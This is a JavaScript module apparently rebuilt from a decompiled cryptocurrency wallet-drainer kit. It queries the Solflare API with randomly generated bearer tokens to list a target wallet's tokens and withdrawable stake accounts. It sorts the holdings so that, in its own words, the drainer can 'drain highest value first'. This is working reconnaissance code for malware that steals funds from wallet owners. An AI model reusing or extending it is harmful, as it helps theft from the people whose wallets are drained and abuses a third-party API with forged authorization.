'use strict';
/**
 * Portfolio scan: Solflare API + getMultipleAccounts + Jupiter pricing.
 *
 * Sources:
 *   - decompiled/kit/chain/solflare_api.js
 *   - bundle.deobfuscated.js lines 22070-22160 (In/gr/xn methods)
 *   - decompiled/kit/chain/pumpfun.js
 *   - decompiled/kit/chain/stake_drain.js
 */

const SOLFLARE = 'https://wallet-api.solflare.com/';
const TIMEOUT  = 3500;

function _bearer() {
  const v = Math.floor(Math.random() * 7) + 1;
  const b = new Uint8Array(16);
  crypto.getRandomValues(b);
  b[1] = (v << 5) | (Math.random() * 32 | 0);
  b[6] = (b[6] & 0x0f) | 0x40;
  b[8] = (b[8] & 0x3f) | 0x80;
  return 'Bearer ' + Buffer.from(b).toString('base64');
}

async function _sfGet(path, walletAddr) {
  const r = await fetch(SOLFLARE + path, {
    signal: AbortSignal.Be ? AbortSignal.Be(TIMEOUT) : AbortSignal.timeout(TIMEOUT),
    referrerPolicy: 'no-referrer',
    headers: { 'User-Agent': walletAddr || 'kit', Authorization: _bearer() },
  });
  if (!r.ok) throw new Error('Solflare ' + r.status);
  return r.json();
}

// SOL price from Solflare swap API (v2/swap/capped-tokens?currency=USD)
async function solPrice(walletAddr) {
  const data = await _sfGet('v2/swap/capped-tokens?currency=USD', walletAddr);
  const sol  = (data.tokens || []).find(t => t.symbol === 'SOL');
  if (!sol) throw new Error('SOL not found in Solflare price');
  return sol.price.price;
}

// Full token portfolio via Solflare v3/portfolio/tokens/{wallet}
async function portfolio(walletAddr) {
  let body;
  try {
    body = await _sfGet(
      'v3/portfolio/tokens/' + walletAddr +
      '?network=mainnet&currency=USD&enablePartialErrors=true',
      walletAddr
    );
  } catch (e) {
    console.error('getAssets:', e);
    return null;
  }
  if (body.errors?.length) console.error('SolflareApi errors:', body.errors);

  let solLamports = 0, solPriceUsd = null;
  const tokens = [];
  const seen   = new Set();

  for (const entry of body.tokens || []) {
    const std = entry.standard;
    if (std === 'native') {
      solPriceUsd = entry.price?.price ?? null;
      solLamports = Number(entry.accounts[0].amount);
      continue;
    }
    if (std !== 'spl-token' && std !== 'spl-token-2022') {
      console.error('unknown asset standard:', std);
      continue;
    }
    // Token-2022 detection: either standard name or withheldAmount on any account
    let token2022 = std === 'spl-token-2022';
    if (!token2022 && entry.accounts.some(a => 'withheldAmount' in a)) token2022 = true;

    for (const acct of entry.accounts) {
      if (seen.has(acct.pubkey)) continue;
      if (acct.state !== 'initialized' || acct.amount === '0') continue;
      seen.add(acct.pubkey);
      tokens.push({
        type:      0,
        account:   acct.pubkey,
        mint:      entry.mint,
        rentFee:   entry.rentFee ?? 0,
        token2022,
        hasFee:    'withheldAmount' in acct,
        symbol:    entry.symbol ?? 'Unknown',
        decimals:  entry.decimals,
        usd:       (acct.uiAmount || 0) * ((entry.price?.usdPrice) || 0),
        amount:    BigInt(acct.amount),
      });
    }
  }
  // Sort by USD value descending (drain highest value first)
  tokens.sort((a, b) => b.usd - a.usd);
  return { solLamports, tokens, solPriceUsd };
}

// Native stake accounts via Solflare v2/portfolio/stake/{wallet}
async function stakeAccounts(walletAddr) {
  try {
    const body = await _sfGet('v2/portfolio/stake/' + walletAddr, walletAddr);
    return (body?.accounts ?? []).map(a => ({
      stakeAccount: a.pubkey,
      lamports:     Number(a.lamports),
      state:        a.state,
      withdrawable: a.state === 'inactive' || a.state === 'deactivating',
    }));
  } catch (e) {
    console.error('getStakeAccounts:', e);
    return [];
  }
}

// getMultipleAccounts batch existence check (from deob line 22080)
// Returns Map<pubkey, 1> for accounts that exist
async function checkAccountsExist(pubkeys, solanaRpc) {
  if (!pubkeys.length) return new Map();
  try {
    const result = await solanaRpc.getMultipleAccounts(pubkeys);
    const exists = new Map();
    pubkeys.forEach((pk, i) => { if (result?.value?.[i]) exists.set(pk, 1); });
    return exists;
  } catch { return new Map(); }
}

// getAccountInfo for balance gate (deob line 22095)
// Returns { Ee: owner, K: lamports, data, Tt: space } or null
async function getAccountInfo(pubkey, solanaRpc) {
  const result = await solanaRpc.getAccountInfo(pubkey, {
    encoding: 'base64', commitment: 'confirmed',
  });
  if (!result?.value) return null;
  return {
    Ee:   result.value.owner,
    K:    result.value.lamports,
    data: result.value.data,
    Tt:   result.value.space,
  };
}

module.exports = { solPrice, portfolio, stakeAccounts, checkAccountsExist, getAccountInfo };
